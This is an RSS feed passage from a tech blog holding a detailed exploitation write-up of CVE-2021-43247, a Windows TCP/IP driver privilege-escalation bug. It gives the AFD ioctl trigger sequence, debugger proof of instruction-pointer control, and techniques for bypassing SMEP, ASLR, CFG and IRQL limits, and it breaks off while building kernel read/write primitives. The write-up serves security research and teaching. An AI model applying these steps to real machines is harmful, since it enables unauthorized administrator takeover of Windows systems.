<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>lolcads tech blog</title><link>https://lolcads.github.io/</link><description>Recent content on lolcads tech blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&amp;copy; lolcads</copyright><lastBuildDate>Thu, 02 Jun 2022 10:59:55 +0200</lastBuildDate><atom:link href="https://lolcads.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Exploiting CVE-2021-43247</title><link>https://lolcads.github.io/posts/2022/06/exploiting_cve_2021_43247/</link><pubDate>Thu, 02 Jun 2022 10:59:55 +0200</pubDate><guid>https://lolcads.github.io/posts/2022/06/exploiting_cve_2021_43247/</guid><description>In this blog post I will go in depth into the inner workings of CVE-2021-43247, which was fixed on the 14th of December 2021. This bug was classified as &amp;ldquo;Windows TCP/IP Driver Elevation of Privilege Vulnerability&amp;rdquo;. The vulnerability itself was probably dormant for a long time, but became exploitable when the AF_UNIX address family was first introduced in 2019.
I will also take this as an excuse to explain in detail, what drivers are, how user space communicates with drivers, what a Local Privilege Escalation (LPE) is and what how we can achieve it in this case.</description><content>&lt;p>In this blog post I will go in depth into the inner workings of &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-43247">CVE-2021-43247&lt;/a>, which was fixed on the 14th of December 2021.
This bug was classified as &amp;ldquo;Windows TCP/IP Driver Elevation of Privilege Vulnerability&amp;rdquo;.
The vulnerability itself was probably dormant for a long time, but became exploitable when the &lt;code>AF_UNIX&lt;/code> address family
was first introduced in 2019.&lt;/p>
&lt;p>I will also take this as an excuse to explain in detail, what drivers are, how user space communicates with drivers,
what a Local Privilege Escalation (LPE) is and what how we can achieve it in this case.&lt;/p>
&lt;h2 id="the-goal--what-is-an-lpe-local-privilege-escalation">The goal / what is an LPE (Local Privilege Escalation)&lt;/h2>
&lt;p>A Local Privilege Escalation (sometimes also called Elevation of Privilege or EoP) is an exploit which obtains some privilege
that it is not supposed to be able to get. In the traditional cases (as in this one) this means we start out with at normal
user shell and end up with administrator access. On Linux this would be about obtaining a root shell.
This is usually done through a bug in a privileged process, a bug in a driver or a bug in the operating system itself.&lt;/p>
&lt;p>As the CVE description tells us, we are dealing with a bug in the TCP/IP driver.&lt;/p>
&lt;h2 id="what-are-drivers-and-how-does-user-space-communicate-with-them">What are drivers and how does user space communicate with them?&lt;/h2>
&lt;p>Drivers are simply &lt;a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">PE files&lt;/a>, which the kernel loads into the kernel address space.
PE (Portable Executable) is the executable file format used by Windows, it&amp;rsquo;s used by &amp;ldquo;.exe&amp;rdquo; and &amp;ldquo;.dll&amp;rdquo; files.
Drivers usually have the file extension &amp;ldquo;.sys&amp;rdquo;, but there are also library drivers which also get the &amp;ldquo;.dll&amp;rdquo; file extension.
Most drivers are contained in the &amp;ldquo;C:\windows\system32\drivers&amp;rdquo; directory.
What drivers are loaded on system startup is determined by the registry and the physical devices available to the system.&lt;/p>
&lt;p>User space can communicate with the loaded drivers using kernel system calls (or syscalls for short). For example, consider the program&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// blog_socket.c - small example program used in this blog
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;winsock.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>() {
&lt;span style="color:#75715e">// Initialize WinSock
&lt;/span>&lt;span style="color:#75715e">&lt;/span> WSAStartup(MAKEWORD(&lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>), &lt;span style="color:#f92672">&amp;amp;&lt;/span>(WSADATA){&lt;span style="color:#ae81ff">0&lt;/span>});
&lt;span style="color:#75715e">// Create a TCP/IPv4 socket.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> SOCKET Socket &lt;span style="color:#f92672">=&lt;/span> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
&lt;span style="color:#75715e">// Bind the socket to any address
&lt;/span>&lt;span style="color:#75715e">&lt;/span> bind(Socket, &lt;span style="color:#f92672">&amp;amp;&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> sockaddr){AF_INET}, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> sockaddr));
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then we can observe the following call stack:&lt;/p>
&lt;pre tabindex="0">&lt;code>00 ntdll!NtCreateFile
01 mswsock!SockSocket+0x56e
02 mswsock!WSPSocket+0x23a
03 WS2_32!WSASocketW+0x130
04 WS2_32!socket+0x6e
05 blog_socket!main+0x84
&lt;/code>&lt;/pre>&lt;p>&lt;code>ntdll!NtCreateFile&lt;/code> is the function that actually transitions into the kernel address space.
The assembly for all &lt;code>ntdll!NtXxx&lt;/code> functions looks something like the following:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">NtCreateFile:
&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">r10&lt;/span>, &lt;span style="color:#66d9ef">rcx&lt;/span> &lt;span style="color:#75715e">; load the first argument into r10, as the syscall
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">; instruction uses rcx as the return location
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">eax&lt;/span>, &lt;span style="color:#ae81ff">0x55&lt;/span> &lt;span style="color:#75715e">; load the syscall value into eax (0x55 is &amp;#39;NtCreateFile&amp;#39;)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">test&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span> &lt;span style="color:#66d9ef">ptr&lt;/span> [.&lt;span style="color:#66d9ef">Running32Bit&lt;/span>], &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#75715e">; check if we are running a 32bit executable
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">jnz&lt;/span> &lt;span style="color:#66d9ef">.Syscallx86&lt;/span>
&lt;span style="color:#75715e">; syscall transitions into the kernel.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">systcall&lt;/span>
&lt;span style="color:#a6e22e">ret&lt;/span>
.Syscallx86:
&lt;span style="color:#75715e">; x86 does not have a syscall instruction, use int 0x2e instead of syscall.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">int&lt;/span> &lt;span style="color:#ae81ff">0x2e&lt;/span>
&lt;span style="color:#a6e22e">ret&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We will only focus on the x64 case here. The syscall instruction loads the new instruction pointer from a
specialized hardware registers (called a model specific register or MSR). Namely, the MSR &lt;code>IA32_LSTAR&lt;/code>.
It also stores the &lt;code>return&lt;/code> address (in this case the address of the &lt;code>ret&lt;/code> instruction) into &lt;code>rcx&lt;/code> and sets the privilege
level of the processor to 0. This is why kernel mode is sometimes referred to as ring 0.&lt;/p>
&lt;p>When the processor is running at privilege level 0, it can access kernel space memory.
Here it is important to know that the address space does not change, but at non-zero privilege level the processor
faults when it is accessing a page which does not have the &lt;code>USER&lt;/code> bit set in the page table.&lt;/p>
&lt;p>In Windows 10 the &lt;code>IA32_LSTAR&lt;/code> MSR points to the function &lt;code>nt!KiSystemCall64&lt;/code>, which first establishes a stack pointer:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">KiSystemCall64:
&lt;span style="color:#a6e22e">swapgs&lt;/span> &lt;span style="color:#75715e">; load saved kernel thread locals from some MSR
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">gs&lt;/span>:[&lt;span style="color:#66d9ef">gs.user_stack&lt;/span>], &lt;span style="color:#66d9ef">rsp&lt;/span> &lt;span style="color:#75715e">; save user stack, in the kernel thread locals
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">rsp&lt;/span>, &lt;span style="color:#66d9ef">gs&lt;/span>:[&lt;span style="color:#66d9ef">gs.kernel_stack&lt;/span>] &lt;span style="color:#75715e">; load kernel space stack, from the thread locals
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">; ... from here we are just in kernel space, and can do whatever we want
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">; e.g. Save all the registers and then call the according NtXxx
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">; kernel function depending on eax.
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The kernel then figures out what kernel function was requested by looking at &lt;code>eax&lt;/code> and transitions to it.
In this case we end up in &lt;code>nt!NtCreateFile&lt;/code> (on the kernel side).&lt;/p>
&lt;pre tabindex="0">&lt;code>00 nt!NtCreateFile &amp;lt;-- Kernel space function
01 nt!KiSystemServiceCopyEnd+0x25
02 ntdll!NtCreateFile+0x14 &amp;lt;-- User space function
03 mswsock!SockSocket+0x4ec
04 mswsock!WSPSocket+0x233
05 WS2_32!WSASocketW+0x1be
06 WS2_32!socket+0x9b
&lt;/code>&lt;/pre>&lt;p>Note that the address space is still the same, as in user space. The difference being that we are now allowed
to access kernel memory. The arguments to &lt;code>nt!NtCreateFile&lt;/code> are unchanged from the arguments &lt;code>ntdll!NtCreateFile&lt;/code>
received. The kernel very carefully validates all arguments and copies them safely to kernel space memory.&lt;/p>
&lt;p>In this case &amp;ldquo;mswsock.dll&amp;rdquo; tries to open a &lt;code>HANDLE&lt;/code> to AFD or the &amp;ldquo;Ancillary Function Driver for WinSock&amp;rdquo;.&lt;/p>
&lt;h2 id="afd">AFD&lt;/h2>
&lt;p>AFD is located at &amp;ldquo;C:\windows\system32\drivers\afd.sys&amp;rdquo; and provides implementations for the usual socket functions.&lt;/p>
&lt;p>As I have hopefully been able to convince you the &lt;code>socket&lt;/code> function corresponds to opening a &lt;code>HANDLE&lt;/code> to AFD using &lt;code>NtCreateFile&lt;/code>.
Using the &lt;code>HANDLE&lt;/code> returned by &lt;code>NtCreateFile&lt;/code>, communication occurs via the &lt;code>NtDeviceIoControlFile&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">__kernel_entry NTSTATUS &lt;span style="color:#a6e22e">NtDeviceIoControlFile&lt;/span>(
[in] HANDLE FileHandle,
[in] HANDLE Event,
[in] PIO_APC_ROUTINE ApcRoutine,
[in] PVOID ApcContext,
[out] PIO_STATUS_BLOCK IoStatusBlock,
[in] ULONG IoControlCode,
[in] PVOID InputBuffer,
[in] ULONG InputBufferLength,
[out] PVOID OutputBuffer,
[in] ULONG OutputBufferLength
);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here, each different socket function corresponds to an &lt;code>IoControlCode&lt;/code> or ioctl for short.
For example, if we &lt;code>bind&lt;/code> the socket we end up in &lt;code>afd!AfdBind&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>00 afd!AfdBind
01 afd!AfdDispatchDeviceControl+0x7d
02 nt!IofCallDriver+0x59
03 nt!IopSynchronousServiceTail+0x1b1
04 nt!IopXxxControlFile+0xe0c
05 nt!NtDeviceIoControlFile+0x56
06 nt!KiSystemServiceCopyEnd+0x25
07 ntdll!NtDeviceIoControlFile+0x14
08 mswsock!WSPBind+0x278
09 WS2_32!bind+0xdf
0a blog_socket!main+0x137
&lt;/code>&lt;/pre>&lt;p>Similarly, &lt;code>recv&lt;/code> corresponds to &lt;code>AfdReceive&lt;/code>, &lt;code>send&lt;/code> corresponds to &lt;code>AfdSend&lt;/code> and so on.
The arguments and return values of these functions are serialized into the &lt;code>InputBuffer&lt;/code> and &lt;code>OutputBuffer&lt;/code>, respectively.&lt;/p>
&lt;h2 id="the-bug">The Bug&lt;/h2>
&lt;p>The bug combines three different features that Windows 10 provides. The &lt;code>TCP_FASTOPEN&lt;/code> option, the &lt;code>ConnectEx&lt;/code>/&lt;code>AfdSuperConnect&lt;/code> function and the &lt;code>AF_UNIX&lt;/code> address family.&lt;/p>
&lt;h3 id="tcp_fastopen">TCP_FASTOPEN&lt;/h3>
&lt;p>Taken from &lt;a href="https://en.wikipedia.org/wiki/TCP_Fast_Open">Wikipedia&lt;/a>, the &lt;code>TCP_FASTOPEN&lt;/code> option allows the client under certain conditions to start sending data to the host without waiting for the &lt;code>ACK&lt;/code> packet. For us, what it does is not important, only that it is necessary to call &lt;code>AfdSuperConnect&lt;/code> later on.&lt;/p>
&lt;h3 id="af_unix">AF_UNIX&lt;/h3>
&lt;p>As mentioned by this blog, the vulnerability probably turned exploitable when Windows &lt;a href="https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/">started supporting&lt;/a> sockets of type &lt;code>AF_UNIX&lt;/code>.
&lt;code>AF_UNIX&lt;/code> sockets provide a means of inter-process communication. For us the important fact is that the associated &lt;code>sockaddr&lt;/code> looks like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#define UNIX_PATH_MAX 108
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> sockaddr_un
{
ADDRESS_FAMILY sun_family; &lt;span style="color:#75715e">/* AF_UNIX */&lt;/span>
&lt;span style="color:#66d9ef">char&lt;/span> sun_path[UNIX_PATH_MAX]; &lt;span style="color:#75715e">/* pathname */&lt;/span>
} SOCKADDR_UN, &lt;span style="color:#f92672">*&lt;/span>PSOCKADDR_UN;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And therefore, with a size of &lt;code>110 = 0x6e&lt;/code> is quite large.&lt;/p>
&lt;h3 id="connectex">ConnectEx&lt;/h3>
&lt;p>The &lt;code>ConnectEx&lt;/code> function is a &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/mswsock/nc-mswsock-lpfn_connectex">Microsoft specific extension&lt;/a>, which can be queried using &lt;code>WSAIoctl&lt;/code>.
The underlying kernel function is &lt;code>AfdSuperConnect&lt;/code>.
Sadly, the user space API validates the arguments to &lt;code>ConnectEx&lt;/code> and therefore we are forced to call it using &lt;code>NtDeviceIoControlFile&lt;/code> directly.
The socket functions do not expose the underlying handles to AFD. This forces us to use &lt;code>NtCreateFile&lt;/code> and &lt;code>NtDeviceIoControlFile&lt;/code> directly for all communication with AFD.&lt;/p>
&lt;p>&lt;code>AfdSuperConnect&lt;/code> gets invoked when using &lt;code>NtDeviceIoControlFile&lt;/code> with the ioctl &lt;code>0x120c7&lt;/code>.
The input buffer for this call consists of 10 bytes, most of which seem to be unused and then any &lt;code>sockaddr&lt;/code>.
The vulnerability occurs when &lt;code>AfdSuperConnect&lt;/code> attempts to connect to a &lt;code>sockaddr&lt;/code> of type &lt;code>AF_UNIX&lt;/code>.&lt;/p>
&lt;h3 id="the-setup">The Setup&lt;/h3>
&lt;ol>
&lt;li>Create an &lt;code>AF_INET&lt;/code> socket using &lt;code>NtCreateFile&lt;/code>.&lt;/li>
&lt;li>Enable the &lt;code>TCP_FASTOPEN&lt;/code> option using &lt;code>AfdTliIoControl&lt;/code> (&lt;code>NtDeviceIoControlFile&lt;/code> with ioctl &lt;code>0x120bf&lt;/code>).&lt;/li>
&lt;li>Bind the socket to any address using ioctl &lt;code>AfdBind&lt;/code> (&lt;code>NtDeviceIoControlFile&lt;/code> with ioctl &lt;code>0x12003&lt;/code>).&lt;/li>
&lt;li>Trigger the vulnerability by using &lt;code>AfdSuperConnect&lt;/code> (&lt;code>NtDeviceIoControlFile&lt;/code> with ioctl &lt;code>0x120c7&lt;/code>) passing a &lt;code>sockaddr&lt;/code> of type &lt;code>AF_UNIX&lt;/code>.&lt;/li>
&lt;/ol>
&lt;p>As we opened the socket as an &lt;code>AF_INET&lt;/code> socket, the call to &lt;code>AfdSuperConnect&lt;/code> ends up in &lt;code>tcpip!TcpTlProviderConnectAndSend&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>00 tcpip!TcpTlProviderConnectAndSend
01 afd!AfdSuperConnect+0x10b26
02 afd!AfdDispatchDeviceControl+0x7d
03 nt!IofCallDriver+0x59
04 nt!IopSynchronousServiceTail+0x1b1
05 nt!IopXxxControlFile+0xe0c
06 nt!NtDeviceIoControlFile+0x56
&lt;/code>&lt;/pre>&lt;p>&lt;code>tcpip!TcpCreateConnectTcb&lt;/code> checks early on whether the &lt;code>TCP_FASTOPEN&lt;/code> option is enabled and if it is not it returns with the error code &lt;code>STATUS_RETRY&lt;/code>.
If it is, it allocates a big internal structure and later on copies the &lt;code>sockaddr&lt;/code> we provided into the internal structure.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Ghidra Decompilation from (tcpip!TcpCreateConnectTcb)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
SockaddrFamily &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>TlConnect&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ConnectSockaddr;
&lt;span style="color:#66d9ef">if&lt;/span> (SockaddrFamily &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x23&lt;/span>) {
sockaddr_size &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">&amp;amp;::&lt;/span>sockaddr_size)[SockaddrFamily];
}
&lt;span style="color:#75715e">/* this is where the magic happens */&lt;/span>
memcpy(&lt;span style="color:#f92672">&amp;amp;&lt;/span>_Dst&lt;span style="color:#f92672">-&amp;gt;&lt;/span>contains_the_function_pointer&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sockaddr,
TlConnect&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ConnectSockaddr, sockaddr_size);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Crucially, as this is all happening in &amp;ldquo;tcpip.sys&amp;rdquo;, the code only expects a &lt;code>sockaddr&lt;/code> of type &lt;code>AF_INET&lt;/code> or &lt;code>AF_INET6&lt;/code> which are of size &lt;code>0x1c&lt;/code> and &lt;code>0x24&lt;/code>, respectively.
Hence, tcpip only reserves &lt;code>0x24&lt;/code> bytes of memory for said &lt;code>sockaddr&lt;/code> and we can overwrite &lt;code>0x6e - 0x24&lt;/code> bytes after the size reserved for the &lt;code>sockaddr&lt;/code>.
Fortunately for us, this range of bytes contains a callback function pointer (originally pointing to &lt;code>afd!AfdTLBufferedSendComplete&lt;/code>) and its callback context argument.&lt;/p>
&lt;p>Prior to the vulnerable &lt;code>memcpy&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>kd&amp;gt; dq rax + f8 L2
ffffac8e`6702a138 fffff806`2d0db540 ffffac8e`6841c9e0
kd&amp;gt; ln fffff806`2d0db540
(fffff806`2d0db540) afd!AfdTLBufferedSendComplete
&lt;/code>&lt;/pre>&lt;p>After the vulnerable &lt;code>memcpy&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>kd&amp;gt; dq ffffac8e`6702a138 L2
ffffac8e`6702a138 13371337`13371337 deaddead`deaddead
&lt;/code>&lt;/pre>&lt;p>The call to &lt;code>tcpip!TcpTlProviderConnectAndSend&lt;/code> eventually fails, returning a status code of &lt;code>STATUS_INVALID_ADDRESS_COMPONENT&lt;/code>,
but not before trying to &amp;ldquo;complete&amp;rdquo; the request, by calling the callback function pointer, passing its callback context as the first argument.&lt;/p>
&lt;pre tabindex="0">&lt;code>Breakpoint 3 hit
tcpip!guard_dispatch_icall_nop:
fffff803`11e36490 ffe0 jmp rax
kd&amp;gt; r rax, rcx
rax=1337133713371337 rcx=deaddeaddeaddead
kd&amp;gt; k
# Child-SP RetAddr Call Site
00 ffffeb0f`32dc18e8 fffff803`11d767fd tcpip!guard_dispatch_icall_nop
01 ffffeb0f`32dc18f0 fffff803`11d73840 tcpip!TcpCreateAndConnectTcbComplete+0xc39
02 ffffeb0f`32dc1b30 fffff803`11d88e2a tcpip!TcpShutdownTcb+0x1040
03 ffffeb0f`32dc1f20 fffff803`11d88d38 tcpip!TcpCreateAndConnectTcbInspectConnectComplete+0xba
04 ffffeb0f`32dc2000 fffff803`11d87be8 tcpip!TcpContinueCreateAndConnect+0x1044
05 ffffeb0f`32dc2220 fffff803`11d87998 tcpip!TcpCreateAndConnectTcbInspectConnectRequestComplete+0x118
06 ffffeb0f`32dc2330 fffff803`11d8709d tcpip!TcpCreateAndConnectTcbWorkQueueRoutine+0x8a8
07 ffffeb0f`32dc2450 fffff803`11ea2247 tcpip!TcpCreateAndConnectTcb+0xcb5
08 ffffeb0f`32dc25d0 fffff803`11995606 tcpip!TcpTlProviderConnectAndSend+0x17
09 ffffeb0f`32dc2600 fffff803`1198958d afd!AfdSuperConnect+0x10b26
&lt;/code>&lt;/pre>&lt;h2 id="exploitability-mitigations-and-complications">Exploitability, Mitigations and Complications&lt;/h2>
&lt;p>As we have seen, the vulnerability gives us full control of the instruction pointer &lt;code>rip&lt;/code> and the first argument &lt;code>rcx&lt;/code>, and does so by calling into a function pointer we can freely choose.
A vulnerability this good is almost always exploitable. But we first have to jump through some loops&amp;hellip;&lt;/p>
&lt;h3 id="smep-supervisor-mode-execution-prevention">SMEP (Supervisor Mode Execution Prevention)&lt;/h3>
&lt;p>The simplest idea to exploit a bug of this kind would be to set the instruction pointer to a user space address,
i.e write some shellcode that when executed in kernel mode will elevate permissions of the current process.
Sadly, Intel thought of this long ago and introduced SMEP.
SMEP uses the fact that user-pages have the &lt;code>USER&lt;/code> flag set in the page tables to throw an exception
when the kernel executes any user address.&lt;/p>
&lt;h3 id="aslr-address-space-layout-randomization">ASLR (Address Space Layout Randomization)&lt;/h3>
&lt;p>Okay, so just executing user space code is out of the question, but what if we first load our shellcode into the kernel? First of, though it sounds hard,
it is actually really easy to allocate arbitrary rwx-memory into kernel space using pipes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">char&lt;/span> rwx_memory [&lt;span style="color:#ae81ff">0x100&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> { &lt;span style="color:#f92672">&amp;lt;&lt;/span>my_shellcode&lt;span style="color:#f92672">&amp;gt;&lt;/span> }; &lt;span style="color:#75715e">// cannot contain zeroes
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
HANDLE read_pipe;
HANDLE write_pipe;
CreatePipe (&lt;span style="color:#f92672">&amp;amp;&lt;/span>read_pipe, &lt;span style="color:#f92672">&amp;amp;&lt;/span>write_pipe, NULL, NULL);
&lt;span style="color:#75715e">// ends up in &amp;#39;NpSetAttribute&amp;#39;
&lt;/span>&lt;span style="color:#75715e">&lt;/span>NtFsControlFile(write_pipe, NULL, NULL, NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>status, &lt;span style="color:#ae81ff">0x11003C&lt;/span>,
rwx_memory, &lt;span style="color:#66d9ef">sizeof&lt;/span>(rwx_memory), output, &lt;span style="color:#66d9ef">sizeof&lt;/span>(output));
&lt;/code>&lt;/pre>&lt;/div>&lt;p>But as far as I know, there is no way for us to know where this allocation will end up (without another exploit or administrator privileges which would defeat the purpose).
Even if we could control the heap perfectly we do not know where the heap starts.
This is because of ASLR (Address Space Layout Randomization). At system startup, Windows randomizes all addresses it will use during runtime.&lt;/p>
&lt;p>So&amp;hellip;? Can we somehow get or leak addresses (or pointers) from the kernel? Fortunately, Windows is very nice to us in this respect.
There is a user space function called &lt;code>NtQuerySystemInformation&lt;/code>, which can be used to retrieve a lot of different kinds of information depending on an &lt;code>InformationClass&lt;/code>.
The &lt;code>InformationClass&lt;/code> we are interested in is &lt;code>SystemModuleInformation&lt;/code>. Using it, we can obtain the loaded base address of every currently running driver on the system,
including the kernel (ntoskrnl.exe) itself.&lt;/p>
&lt;p>By parsing the images contained on disk and using these base addresses, we know the address of every exported kernel function.
One could go one step further and look at all symbols using the public symbols (.pdb) provided by Microsoft,
but for our purposes restricting the search to exported functions was enough.&lt;/p>
&lt;h3 id="cfg-control-flow-guards">CFG (Control Flow Guards)&lt;/h3>
&lt;p>Okay, the plan is to call exported kernel functions, but there (potentially) is one more obstacle in our way the CFG (Control Flow Guard) mitigation.
I did not emphasize this above, but looking at the call stack to the vulnerable call we can see that we are inside of a function called &lt;code>guard_dispatch_icall_nop&lt;/code>.
This means that control flow guards are disabled. If they were enabled we would instead be inside &lt;code>nt!guard_dispatch_icall&lt;/code>.
&lt;code>nt!guard_dispatch_icall&lt;/code> checks whether the address we are jumping to is registered as a CFG target. If the target is not registered, &lt;code>nt!guard_dispatch_icall&lt;/code> crashes the system (mitigating the exploit).
This registration happens when the driver is loaded. The binary contains information on which functions are valid CFG targets.&lt;/p>
&lt;p>You can also view the CFG information using dumpbin:&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;gt; dumpbin /loadconfig C:\windows\system32\ntoskrnl.exe
Microsoft (R) COFF/PE Dumper Version 14.28.29336.0
Copyright (C) Microsoft Corporation. All rights reserved.
Dump of file C:\windows\system32\ntoskrnl.exe
File Type: EXECUTABLE IMAGE
Section contains the following load config:
&amp;lt;...&amp;gt;
Guard CF Function Table
Address
--------
0000000140200010
E 0000000140200050
00000001402000B0
00000001402001A0
E 0000000140200580
E 0000000140200940
E 00000001402009F0
0000000140200C40
00000001402010B0
00000001402010E0
0000000140201200
E 0000000140201750
E 0000000140201770
.
.
.
&lt;/code>&lt;/pre>&lt;p>Therefore, if the exploit is supposed to work even if CFG is enabled, we need to chose our target function as a valid CFG target.&lt;/p>
&lt;h3 id="irql-interrupt-request-level">IRQL (Interrupt Request Level)&lt;/h3>
&lt;p>One last detail that bears mentioning, is the Interrupt Request Level (IRQL). The interrupt Request level is a hardware feature that allows threads to specify what interrupts they are willing to accept.
Importantly, if the IRQL is at &amp;gt;= 2 the thread is not allowed to page-fault anymore. This means that when the IRQL is at least two, the thread cannot access pageable memory anymore.&lt;/p>
&lt;p>Pageable memory is memory that the Windows kernel reserves the right to spill to disk, if the system is running low on memory. If a thread would then access that memory a pagefault would occur and the Windows kernel
would reload the page from disk.&lt;/p>
&lt;p>Why is all this important? Well, it just so happens that the function we are overwriting is a &amp;ldquo;Completion Routine&amp;rdquo;.
Completion Routines are supposed to run at IRQL = 2 and therefore might crash the system whenever they are accessing paged memory.
All user space memory is paged and thus the exploit might crash when accessing user space memory.
Further, not all kernel space functions are non-paged (though most are), further restricting the set of functions we can use in the exploit.&lt;/p>
&lt;p>In reality, we are only interested in providing a proof of concept, so one could just ignore the the fact that the exploit crashes sometimes, but we actually have a solution:&lt;/p>
&lt;p>Sometimes, when the kernel uses a piece of user space memory, it uses so called &lt;a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls">Memory Descriptor Lists (MDL)&lt;/a>. When such a list is &amp;ldquo;locked&amp;rdquo;, the kernel will never page out the memory.
Therefore, we just have to make some request, that will &amp;ldquo;lock&amp;rdquo; an MDL for the user space memory we are using and then we can reliably use it at IRQL = 2.&lt;/p>
&lt;h2 id="primitives">Primitives&lt;/h2>
&lt;p>So, we have control over &lt;code>rip&lt;/code> and &lt;code>rcx&lt;/code> and can call some exported kernel functions, but what is the plan?
Roughly, we want to obtain exploit primitives which allow us to read and write kernel memory:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">u64 &lt;span style="color:#a6e22e">read_u64&lt;/span>(u64 kernel_address);
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_u64&lt;/span>(u64 kernel_address, u64 value);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>These will later be used to give our process administrator privileges using a generalized exploit algorithm.&lt;/p>
&lt;p>We construct these primitives by using the vulnerability with an exported kernel function.
The perfect kernel function for a read primitive would look something like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">read_function&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> read_argument &lt;span style="color:#f92672">*&lt;/span>read){
